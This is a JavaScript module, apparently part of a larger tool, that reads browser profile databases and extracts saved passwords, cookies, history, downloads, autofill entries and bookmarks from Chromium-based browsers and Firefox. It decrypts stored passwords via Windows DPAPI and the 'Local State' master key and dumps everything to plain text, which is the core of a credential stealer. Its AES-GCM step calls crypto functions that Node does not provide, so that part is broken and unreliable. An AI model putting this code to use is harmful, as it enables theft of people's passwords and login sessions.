/**
 * Browser Data Decryption Module
 * Handles decryption and parsing of browser data files
 */

const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { logger } = require('../../core/logger');
const { ErrorHandler, ModuleError } = require('../../core/errors');

// Try to load DPAPI module - will only work on Windows
let dpapi = null;
try {
    dpapi = require('@primno/dpapi');
} catch (error) {
    logger.debug('DPAPI module not available (running on non-Windows system?)');
}

class BrowserDecryptor {
    constructor() {
        this.isWindows = process.platform === 'win32';
        this.masterKey = null;
    }

    /**
     * Decrypt and parse browser data file
     * @param {string} filePath - Path to the browser data file
     * @param {string} dataType - Type of data (passwords, cookies, history, etc.)
     * @param {string} browserType - Browser type (chrome, firefox, edge, etc.)
     * @param {string} profilePath - Profile path for master key lookup
     * @returns {Promise<Array>} Parsed data array
     */
    async decryptAndParse(filePath, dataType, browserType, profilePath = null) {
        try {
            if (!fs.existsSync(filePath)) {
                logger.debug(`Data file does not exist: ${filePath}`);
                return [];
            }

            // Check file size
            const stats = fs.statSync(filePath);
            if (stats.size === 0) {
                logger.debug(`Data file is empty: ${filePath}`);
                return [];
            }

            // Get master key for Chrome v80+ if needed
            if (dataType === 'passwords' && browserType !== 'firefox' && profilePath) {
                this.masterKey = await this.getMasterKey(profilePath);
            }

            // Firefox uses different approach
            if (browserType === 'firefox') {
                return await this.parseFirefoxData(filePath, dataType);
            }

            // Chrome-based browsers (Chrome, Edge, Brave, Opera)
            return await this.parseChromeBasedData(filePath, dataType, browserType);

        } catch (error) {
            logger.error(`Failed to decrypt/parse ${dataType} from ${filePath}`, error.message);
            return [];
        }
    }

    /**
     * Parse Chrome-based browser data
     * @param {string} filePath - Path to the database file
     * @param {string} dataType - Type of data
     * @param {string} browserType - Browser type
     * @returns {Promise<Array>} Parsed data
     */
    async parseChromeBasedData(filePath, dataType, browserType) {
        // Handle bookmarks (JSON file)
        if (dataType === 'bookmarks' && filePath.toLowerCase().includes('bookmarks')) {
            return await this.parseBookmarksFile(filePath);
        }

        return new Promise((resolve, reject) => {
            // Copy file to temp location for reading (browsers may have it locked)
            const tempFile = filePath + '.temp';
            try {
                fs.copyFileSync(filePath, tempFile);
            } catch (error) {
                logger.debug(`Could not copy database file: ${error.message}`);
                resolve([]);
                return;
            }

            const db = new sqlite3.Database(tempFile, sqlite3.OPEN_READONLY, (err) => {
                if (err) {
                    logger.debug(`Could not open database: ${err.message}`);
                    // Clean up temp file
                    try {
                        fs.unlinkSync(tempFile);
                    } catch (e) {}
                    resolve([]);
                    return;
                }

                this.queryDatabase(db, dataType, browserType)
                    .then(data => {
                        db.close((err) => {
                            if (err) {
                                logger.debug(`Error closing database: ${err.message}`);
                            }
                            // Clean up temp file
                            try {
                                fs.unlinkSync(tempFile);
                            } catch (e) {}
                            resolve(data);
                        });
                    })
                    .catch(error => {
                        db.close();
                        try {
                            fs.unlinkSync(tempFile);
                        } catch (e) {}
                        logger.debug(`Database query failed: ${error.message}`);
                        resolve([]);
                    });
            });
        });
    }

    /**
     * Query SQLite database for specific data type
     * @param {Object} db - SQLite database connection
     * @param {string} dataType - Type of data to query
     * @param {string} browserType - Browser type
     * @returns {Promise<Array>} Query results
     */
    async queryDatabase(db, dataType, browserType) {
        return new Promise((resolve, reject) => {
            let query = '';
            let processor = null;

            switch (dataType) {
                case 'passwords':
                    query = `SELECT origin_url, username_value, password_value, date_created 
                            FROM logins 
                            WHERE blacklisted_by_user = 0 
                            ORDER BY date_created DESC`;
                    processor = this.processPasswordRow.bind(this);
                    break;

                case 'cookies':
                    query = `SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc 
                            FROM cookies 
                            ORDER BY creation_utc DESC 
                            LIMIT 1000`;
                    processor = this.processCookieRow.bind(this);
                    break;

                case 'history':
                    query = `SELECT url, title, visit_count, last_visit_time 
                            FROM urls 
                            WHERE visit_count > 0 
                            ORDER BY last_visit_time DESC 
                            LIMIT 1000`;
                    processor = this.processHistoryRow.bind(this);
                    break;

                case 'downloads':
                    query = `SELECT target_path, referrer, total_bytes, start_time, end_time, state 
                            FROM downloads 
                            ORDER BY start_time DESC 
                            LIMIT 500`;
                    processor = this.processDownloadRow.bind(this);
                    break;

                case 'autofill':
                    query = `SELECT name, value, count, date_created 
                            FROM autofill 
                            ORDER BY count DESC, date_created DESC 
                            LIMIT 500`;
                    processor = this.processAutofillRow.bind(this);
                    break;

                default:
                    resolve([]);
                    return;
            }

            const results = [];
            db.each(query, (err, row) => {
                if (err) {
                    logger.debug(`Query error: ${err.message}`);
                    return;
                }

                try {
                    const processedRow = processor ? processor(row, browserType) : row;
                    if (processedRow) {
                        results.push(processedRow);
                    }
                } catch (error) {
                    logger.debug(`Row processing error: ${error.message}`);
                }
            }, (err, count) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(results);
                }
            });
        });
    }

    /**
     * Process password row and decrypt password
     * @param {Object} row - Database row
     * @param {string} browserType - Browser type
     * @returns {Object} Processed password data
     */
    processPasswordRow(row, browserType) {
        try {
            let password = '';
            
            if (row.password_value && row.password_value.length > 0) {
                if (this.isWindows && dpapi) {
                    try {
                        const encryptedPassword = Buffer.from(row.password_value);
                        
                        // Check if it's Chrome v80+ format (starts with "v10" or "v11")
                        if (encryptedPassword.length > 3 && 
                            (encryptedPassword.toString('utf8', 0, 3) === 'v10' || 
                             encryptedPassword.toString('utf8', 0, 3) === 'v11')) {
                            
                            // Try to decrypt with master key
                            if (this.masterKey) {
                                password = this.decryptChromeV80Password(encryptedPassword, this.masterKey);
                            } else {
                                password = '[Encrypted - Chrome v80+ - Master Key Not Available]';
                                logger.debug(`Master key not available for ${browserType} v80+ decryption`);
                            }
                        } else {
                            // Try DPAPI decryption for older versions
                            try {
                                const decrypted = dpapi.unprotectData(encryptedPassword, null, 'CurrentUser');
                                password = decrypted.toString('utf8');
                            } catch (dpapiError) {
                                logger.debug(`DPAPI decryption failed for ${browserType}:`, dpapiError.message);
                                // Try different DPAPI flags if first attempt fails
                                try {
                                    const decrypted = dpapi.unprotectData(encryptedPassword, null, 'LocalMachine');
                                    password = decrypted.toString('utf8');
                                } catch (secondError) {
                                    password = '[DPAPI Decryption Failed]';
                                    logger.debug(`Secondary DPAPI decryption also failed:`, secondError.message);
                                }
                            }
                        }
                    } catch (error) {
                        password = '[Decryption Failed]';
                        logger.debug(`General decryption error for ${browserType}:`, error.message);
                    }
                } else if (!this.isWindows) {
                    password = '[Encrypted - Non-Windows System]';
                } else {
                    password = '[DPAPI Module Not Available]';
                }
            }

            return {
                url: row.origin_url || '',
                username: row.username_value || '',
                password: password,
                dateCreated: this.formatTimestamp(row.date_created)
            };
        } catch (error) {
            logger.debug(`Password processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process cookie row
     * @param {Object} row - Database row
     * @returns {Object} Processed cookie data
     */
    processCookieRow(row) {
        try {
            return {
                host: row.host_key || '',
                name: row.name || '',
                value: row.value || '',
                path: row.path || '',
                secure: row.is_secure === 1,
                httpOnly: row.is_httponly === 1,
                expires: this.formatTimestamp(row.expires_utc),
                created: this.formatTimestamp(row.creation_utc)
            };
        } catch (error) {
            logger.debug(`Cookie processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process history row
     * @param {Object} row - Database row
     * @returns {Object} Processed history data
     */
    processHistoryRow(row) {
        try {
            return {
                url: row.url || '',
                title: row.title || '',
                visitCount: row.visit_count || 0,
                lastVisit: this.formatTimestamp(row.last_visit_time)
            };
        } catch (error) {
            logger.debug(`History processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process download row
     * @param {Object} row - Database row
     * @returns {Object} Processed download data
     */
    processDownloadRow(row) {
        try {
            return {
                path: row.target_path || '',
                referrer: row.referrer || '',
                size: row.total_bytes || 0,
                startTime: this.formatTimestamp(row.start_time),
                endTime: this.formatTimestamp(row.end_time),
                state: row.state || 0
            };
        } catch (error) {
            logger.debug(`Download processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process autofill row
     * @param {Object} row - Database row
     * @returns {Object} Processed autofill data
     */
    processAutofillRow(row) {
        try {
            return {
                name: row.name || '',
                value: row.value || '',
                count: row.count || 0,
                dateCreated: this.formatTimestamp(row.date_created)
            };
        } catch (error) {
            logger.debug(`Autofill processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Get Chrome master key from Local State file
     * @param {string} profilePath - Browser profile path
     * @returns {Promise<Buffer|null>} Master key or null
     */
    async getMasterKey(profilePath) {
        try {
            // Try multiple locations for Local State file
            const possiblePaths = [];
            
            // Standard location: go up to parent directory
            const userDataPath = path.dirname(profilePath);
            possiblePaths.push(path.join(userDataPath, 'Local State'));
            
            // Alternative: sometimes the profilePath is already the User Data folder
            possiblePaths.push(path.join(profilePath, 'Local State'));
            
            // Alternative: go up two levels if profilePath is deep
            const grandParentPath = path.dirname(userDataPath);
            possiblePaths.push(path.join(grandParentPath, 'Local State'));
            
            let localStatePath = null;
            for (const testPath of possiblePaths) {
                logger.debug(`Testing Local State path: ${testPath}`);
                if (fs.existsSync(testPath)) {
                    localStatePath = testPath;
                    logger.debug(`Found Local State at: ${localStatePath}`);
                    break;
                }
            }
            
            if (!localStatePath) {
                logger.debug('Local State file not found at any expected location');
                logger.debug(`Searched paths: ${possiblePaths.join(', ')}`);
                return null;
            }

            const localStateData = fs.readFileSync(localStatePath, 'utf8');
            const localState = JSON.parse(localStateData);
            
            if (!localState.os_crypt || !localState.os_crypt.encrypted_key) {
                logger.debug('No encrypted key found in Local State - os_crypt structure missing');
                return null;
            }

            logger.debug('Found encrypted key in Local State');

            // Decode the base64 encrypted key
            const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
            
            // Remove DPAPI prefix "DPAPI"
            if (encryptedKey.length < 5 || encryptedKey.subarray(0, 5).toString() !== 'DPAPI') {
                logger.debug(`Invalid encrypted key format - expected DPAPI prefix, got: ${encryptedKey.subarray(0, 5).toString()}`);
                return null;
            }

            const keyWithoutPrefix = encryptedKey.subarray(5);
            logger.debug(`Attempting to decrypt master key with DPAPI (${keyWithoutPrefix.length} bytes)`);
            
            if (this.isWindows && dpapi) {
                try {
                    const decryptedKey = dpapi.unprotectData(keyWithoutPrefix, null, 'CurrentUser');
                    logger.debug(`Successfully decrypted master key (${decryptedKey.length} bytes)`);
                    return decryptedKey;
                } catch (error) {
                    logger.debug('Failed to decrypt master key with CurrentUser, trying LocalMachine:', error.message);
                    try {
                        const decryptedKey = dpapi.unprotectData(keyWithoutPrefix, null, 'LocalMachine');
                        logger.debug(`Successfully decrypted master key with LocalMachine (${decryptedKey.length} bytes)`);
                        return decryptedKey;
                    } catch (secondError) {
                        logger.debug('Failed to decrypt master key with LocalMachine:', secondError.message);
                        return null;
                    }
                }
            } else {
                logger.debug('DPAPI not available for master key decryption (not Windows or module missing)');
                return null;
            }
        } catch (error) {
            logger.debug('Master key extraction failed:', error.message);
            return null;
        }
    }
    async parseBookmarksFile(filePath) {
        try {
            const data = fs.readFileSync(filePath, 'utf8');
            const bookmarks = JSON.parse(data);
            
            const results = [];
            
            // Recursively parse bookmark folders
            const parseBookmarkFolder = (folder, folderPath = '') => {
                if (folder.children) {
                    for (const child of folder.children) {
                        if (child.type === 'url') {
                            results.push({
                                name: child.name || '',
                                url: child.url || '',
                                folder: folderPath,
                                dateAdded: this.formatTimestamp(child.date_added)
                            });
                        } else if (child.type === 'folder') {
                            const newPath = folderPath ? `${folderPath}/${child.name}` : child.name;
                            parseBookmarkFolder(child, newPath);
                        }
                    }
                }
            };

            // Parse root bookmark folders
            if (bookmarks.roots) {
                if (bookmarks.roots.bookmark_bar) {
                    parseBookmarkFolder(bookmarks.roots.bookmark_bar, 'Bookmarks Bar');
                }
                if (bookmarks.roots.other) {
                    parseBookmarkFolder(bookmarks.roots.other, 'Other Bookmarks');
                }
                if (bookmarks.roots.synced) {
                    parseBookmarkFolder(bookmarks.roots.synced, 'Mobile Bookmarks');
                }
            }

            return results;
        } catch (error) {
            logger.debug(`Bookmarks parsing error: ${error.message}`);
            return [];
        }
    }
    async parseFirefoxData(filePath, dataType) {
        try {
            if (dataType === 'passwords' && filePath.endsWith('logins.json')) {
                // Firefox stores passwords in JSON format
                const data = fs.readFileSync(filePath, 'utf8');
                const loginData = JSON.parse(data);
                
                return (loginData.logins || []).map(login => {
                    // Firefox passwords are encrypted - show proper status instead of raw data
                    let username = '[Encrypted - Firefox NSS]';
                    let password = '[Encrypted - Firefox NSS]';
                    
                    // Check if the values are actually encrypted (base64-like strings)
                    if (login.encryptedUsername && typeof login.encryptedUsername === 'string') {
                        if (login.encryptedUsername.length > 50 && login.encryptedUsername.includes('=')) {
                            username = '[Encrypted - Firefox NSS]';
                        } else {
                            username = login.encryptedUsername; // Might be plaintext
                        }
                    }
                    
                    if (login.encryptedPassword && typeof login.encryptedPassword === 'string') {
                        if (login.encryptedPassword.length > 50 && login.encryptedPassword.includes('=')) {
                            password = '[Encrypted - Firefox NSS]';
                        } else {
                            password = login.encryptedPassword; // Might be plaintext
                        }
                    }
                    
                    return {
                        url: login.hostname || '',
                        username: username,
                        password: password,
                        dateCreated: this.formatTimestamp(login.timeCreated)
                    };
                });
            }

            // For SQLite files in Firefox
            if (filePath.endsWith('.sqlite')) {
                return await this.parseChromeBasedData(filePath, dataType, 'firefox');
            }

            return [];
        } catch (error) {
            logger.debug(`Firefox data parsing error: ${error.message}`);
            return [];
        }
    }

    /**
     * Decrypt Chrome v80+ password using AES-GCM
     * @param {Buffer} encryptedPassword - Encrypted password buffer
     * @param {Buffer} masterKey - Master key for decryption
     * @returns {string} Decrypted password or error message
     */
    decryptChromeV80Password(encryptedPassword, masterKey) {
        try {
            const crypto = require('crypto');
            
            // Validate inputs
            if (!encryptedPassword || !masterKey) {
                logger.debug('Invalid inputs to Chrome v80+ decryption');
                return '[Invalid Decryption Parameters]';
            }
            
            // Chrome v80+ format: "v10" + 12-byte nonce + encrypted data + 16-byte auth tag
            if (encryptedPassword.length < 31) { // 3 + 12 + 1 + 16 = minimum length
                logger.debug(`Chrome v80+ password too short: ${encryptedPassword.length} bytes`);
                return '[Invalid Encrypted Data Length]';
            }

            const version = encryptedPassword.subarray(0, 3).toString();
            const nonce = encryptedPassword.subarray(3, 15);
            const ciphertext = encryptedPassword.subarray(15, -16);
            const authTag = encryptedPassword.subarray(-16);
            
            logger.debug(`Chrome v80+ decryption: version=${version}, nonce=${nonce.length}bytes, ciphertext=${ciphertext.length}bytes, authTag=${authTag.length}bytes`);

            // Validate master key length (should be 32 bytes for AES-256)
            if (masterKey.length !== 32) {
                logger.debug(`Invalid master key length: ${masterKey.length} bytes (expected 32)`);
                return '[Invalid Master Key Length]';
            }

            // Create decipher
            const decipher = crypto.createDecipherGCM('aes-256-gcm');
            decipher.setKey(masterKey);
            decipher.setIV(nonce);
            decipher.setAuthTag(authTag);

            // Decrypt
            let decrypted = decipher.update(ciphertext);
            decipher.final(); // This will throw if authentication fails
            
            const result = decrypted.toString('utf8');
            logger.debug(`Chrome v80+ decryption successful, result length: ${result.length}`);
            return result;
        } catch (error) {
            logger.debug(`Chrome v80+ decryption failed: ${error.message}`);
            if (error.message.includes('auth')) {
                return '[Chrome v80+ Authentication Failed - Wrong Master Key]';
            }
            return '[Chrome v80+ Decryption Failed]';
        }
    }
    formatTimestamp(timestamp) {
        try {
            if (!timestamp || timestamp === 0) {
                return 'Unknown';
            }

            // Chrome timestamps are microseconds since January 1, 1601 UTC
            const epochDiff = 11644473600000000; // Microseconds between 1601 and 1970
            const jsTimestamp = (timestamp - epochDiff) / 1000; // Convert to milliseconds
            
            const date = new Date(jsTimestamp);
            return date.toISOString().replace('T', ' ').replace('Z', '');
        } catch (error) {
            return 'Invalid Date';
        }
    }

    /**
     * Convert data array to formatted text
     * @param {Array} data - Parsed data array
     * @param {string} dataType - Type of data
     * @returns {string} Formatted text content
     */
    formatDataAsText(data, dataType) {
        if (!data || data.length === 0) {
            return `No ${dataType} found.\n`;
        }

        let text = `=== ${dataType.toUpperCase()} (${data.length} entries) ===\n\n`;

        switch (dataType) {
            case 'passwords':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.url}\n`;
                    text += `Username: ${item.username}\n`;
                    text += `Password: ${item.password}\n`;
                    text += `Date Created: ${item.dateCreated}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'cookies':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.host}\n`;
                    text += `Name: ${item.name}\n`;
                    text += `Value: ${item.value}\n`;
                    text += `Path: ${item.path}\n`;
                    text += `Secure: ${item.secure}\n`;
                    text += `HttpOnly: ${item.httpOnly}\n`;
                    text += `Expires: ${item.expires}\n`;
                    text += `Created: ${item.created}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'history':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.title}\n`;
                    text += `URL: ${item.url}\n`;
                    text += `Visit Count: ${item.visitCount}\n`;
                    text += `Last Visit: ${item.lastVisit}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'downloads':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${path.basename(item.path)}\n`;
                    text += `Full Path: ${item.path}\n`;
                    text += `Referrer: ${item.referrer}\n`;
                    text += `Size: ${item.size} bytes\n`;
                    text += `Start Time: ${item.startTime}\n`;
                    text += `End Time: ${item.endTime}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'autofill':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.name}\n`;
                    text += `Value: ${item.value}\n`;
                    text += `Count: ${item.count}\n`;
                    text += `Date Created: ${item.dateCreated}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'bookmarks':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.name}\n`;
                    text += `URL: ${item.url}\n`;
                    text += `Folder: ${item.folder}\n`;
                    text += `Date Added: ${item.dateAdded}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            default:
                text += JSON.stringify(data, null, 2);
        }

        return text;
    }
}

module.exports = {
    BrowserDecryptor
};